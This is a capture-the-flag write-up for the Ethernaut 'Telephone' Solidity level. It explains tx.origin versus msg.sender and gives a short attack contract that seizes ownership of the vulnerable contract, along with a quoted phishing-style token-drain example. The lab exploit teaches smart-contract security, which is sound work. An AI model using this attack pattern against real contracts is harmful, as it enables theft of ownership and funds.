# Telephone

![https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg](https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg)

# Objectives

Claim ownership of the contract

# Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

# Analysis

`owner` can be assigned in two places in this contract. One in the `constructor()` and the other in the `changeOwner` function. Since constructor has already been invoked during the deployment of the contract, that leaves us with the `changeOwner` function.

```solidity
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

This function takes the `address` of the `msg.sender` and assigns it to be the `owner` of the contract. However it requires `tx.origin` not to be the `msg.sender`. So what are these values?

## What is `tx.origin` and `msg.sender`?

In solidity, `tx.origin` is the original external account that created the transaction. This global value is passed along different function calls to other contracts. But `msg.sender` is the account (smart contract or external) that made the call of the function.

Example - 

If Alice sends a transaction to contract A, contract A sees the address of Alice as `msg.sender` and `tx.origin`. If contract A sends a message (call) to contract B, B sees the contract A’s address as `msg.sender` and Alice’s address as `tx.origin`.

```
Alice --> Contract A
		msg.sender = Alice
		tx.origin = Alice

Contract A --> Contract B
		msg.sender = Contract A
		tx.origin = Alice
```

In Summary, 

`tx.origin` is like the root or highest level caller, and

`msg.sender` is the immediate caller

Now that we understand what is `tx.origin` and `msg.sender`, and what are the differences between them. It is pretty clear that we can exploit the contract using this loophole.

# AntiSec

The hack is pretty much simple and straight forward. We will exploit the contract by using the `tx.origin != msg.sender` loophole. All we have to do is write a malicious contract, pass the contract address of the `Telephone` contract and call the `changeOwner` function from our malicious contract. In which case, the `tx.origin` and `msg.sender` won’t be same and we will own the contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract AttackTelephone {

    Telephone telephone;
    address public owner;

    constructor(address _victimAddress) {
        owner = msg.sender;
        telephone = Telephone(_victimAddress);
    }

    function attack() public {
        telephone.changeOwner(owner);
    }
}
```

Once the transaction goes through, we can check if we are the new owner of the contract by

```jsx
await contract.owner()
```

# Key Takeaways

<aside>
💡 While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/)

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```solidity
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```solidity
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
</aside>

The above message is quoted by OpenZeppelin. In addition to that, I will just leave a link to one of [Vitalik Buterin](https://ethereum.stackexchange.com/users/188/vitalik-buterin)’s response in [ethereum.stackexchange.com](http://ethereum.stackexchange.com/) - 

> 1. Do NOT rely on very fine-grained calculations of current gas costs. Assume that gas costs of contract calling may go up or down by up to an order of magnitude in a future hard fork.
> 2. If creating contracts in assembly (ie. not serpent, solidity or LLL), do NOT use dynamic JUMP/JUMPI operations (ie. every JUMP/JUMPI should be **immediately preceded** by a PUSH value specifying the exact point in the code to jump to)
> 3. Do NOT do anything important based on the DIFFICULTY opcode.
> 4. Do NOT rely on the assumption of a block time between 12-20 seconds.
> 5. Do NOT assume that BLOCKHASHes will be a reliable source of randomness.
> 6. Do NOT assume that tx.origin will continue to be usable or meaningful.
> 7. Do NOT assume that opcodes other than 0xfe will continue to be invalid.
> 
> It's not certain that all of those steps will be required, or that they will be sufficient, but that should get you most of the way there.

https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof
